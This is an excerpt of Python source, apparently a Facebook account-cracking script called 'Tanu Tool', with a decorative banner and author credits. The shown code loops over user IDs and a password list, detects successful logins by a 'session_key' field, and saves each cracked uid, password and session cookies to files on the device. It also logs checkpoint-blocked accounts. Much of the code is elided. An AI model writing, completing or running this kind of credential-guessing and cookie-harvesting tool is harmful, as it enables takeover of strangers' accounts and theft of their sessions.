...
logo=(f"""{GREEN}
.d8888. d888888b .88b  d88.  .d88b.  
88'  YP   `88'   88'YbdP`88 .8P  Y8. 
`8bo.      88    88  88  88 88    88 
  `Y8b.    88    88  88  88 88    88 
db   8D   .88.   88  88  88 `8b  d8' 
`8888Y' Y888888P YP  YP  YP  `Y88P'       
                                        
{WHITE}[•] AUTHOR       : SIMO
[•] GitHub       : SIMO
[•] FaceBook     : X-Ꮇ ᏚᎥᎷᏫ.ꜝ䄟ꜝ. くあ
[•] Version      :   {GREEN}0.1

{GREEN}================================================
        \033[1;35m Welcome To Tanu Tool \33[0;m
{GREEN}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Tanu-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Tanu.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Tanu-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Tanu-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
